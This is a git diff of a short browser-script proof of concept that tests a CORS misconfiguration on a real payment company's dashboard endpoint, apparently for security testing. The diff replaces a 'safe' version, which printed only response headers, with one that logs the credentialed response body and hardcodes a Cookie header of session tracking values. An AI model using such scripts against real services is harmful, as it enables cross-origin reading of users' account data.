@@ -1,44 +1,12 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Rapyd CORS PoC (Safe)</title>
-</head>
-<body>
-<h2>Rapyd CORS Misconfiguration PoC</h2>
-<pre id="output"></pre>
-
 <script>
-const output = document.getElementById('output');
-
-// الدالة اللي هتعمل request
-async function testCORS() {
-    try {
-        const res = await fetch('https://dashboard.rapyd.net/v1/users', {
-            method: 'GET',
-            credentials: 'include' // مهمة عشان تبعت session cookies
-        });
-
-        // نجمع الـ headers في object
-        let headers = {};
-        for (let pair of res.headers.entries()) {
-            headers[pair[0]] = pair[1];
-        }
-
-        const data = {
-            status: res.status,
-            statusText: res.statusText,
-            headers: headers
-        };
-
-        output.textContent = JSON.stringify(data, null, 2);
-    } catch (err) {
-        output.textContent = 'Error: ' + err;
-    }
-}
-
-// نفّذ الدالة
-testCORS();
+fetch('https://dashboard.rapyd.net/v1/users', {
+  method: 'GET',
+  credentials: 'include',
+  headers: {
+    'Cookie': "_vwo_uuid=DD30D8F68F83F1DE3E1936AE77E996A20; _vwo_ds=3%241757263708%3A38.46534428%3A%3A; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; __hssrc=1; _gcl_au=1.1.517039479.1757263708; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Sep+07+2025+13%3A10%3A35+GMT-0400+(Eastern+Daylight+Time)&version=202410.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2Fwww.rapyd.net%2F&groups=C0004%3A1%2CC0003%3A1%2CC0002%3A1%2CC0001%3A1; _vwo_uuid_v2=DD30D8F68F83F1DE3E1936AE77E996A20|5b388739a533ff63d79572b114fab866; _ga_BZV2PBD0GX=GS2.1.s1757271365$o2$g1$t1757275098$j58$l0$h0; _ga=GA1.2.1637702146.1757263708; _gid=GA1.2.1658742699.1757268368; _ga_WEP8ZE9L29=GS2.1.s1757271342$o3$g1$t1757275098$j58$l0$h0; __hstc=199737905.6d70583c7da70adb2e363908e296ea71.1757263710831.1757268368643.1757271366238.3; hubspotutk=6d70583c7da70adb2e363908e296ea71; __hssc=199737905.6.1757271366238; fs_uid=#1616VV#1aa6f751-be56-4f7e-a9ce-dc6f32d2e63c:3a491ff3-3b88-46b7-a876-47cf5ce4987e:1757272492251::5#900a9e90#/1788808512; _fbp=fb.1.1757263709978.946959870566231350; fs_lua=1.1757275268842"
+  }
+})
+.then(res => res.json())
+.then(data => console.log('Response data:', data))
+.catch(err => console.error('Error:', err));
 </script>
-</body>
-</html>
